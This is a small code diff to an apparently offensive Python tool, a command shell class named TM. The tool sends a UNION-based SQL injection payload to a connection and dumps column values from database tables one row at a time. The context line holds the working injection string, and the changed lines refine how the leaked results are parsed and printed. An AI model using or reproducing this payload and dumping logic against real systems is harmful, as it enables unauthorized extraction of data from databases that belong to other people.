@@ -101,9 +101,9 @@ class TM(Cmd):
 			self.write_db = b"') union select %s,2 from %s limit %d,1#\n" %(bytes(self.column, encoding='utf-8'), bytes(self.table, encoding='utf-8'), dump_id)
 			self.dbs.write(self.write_db)
 			self.dbs = self.dbs.read_all().decode('ascii')
-			del self.dbs.split()[0:19]
+			self.dbs = self.dbs.split()[::-1][0]
 
-			if(not self.dbs.split()[::-1][0] == "object"):
+			if(not self.dbs == "object"):
 				print(self.dbs)
 
 if __name__ == "__main__":
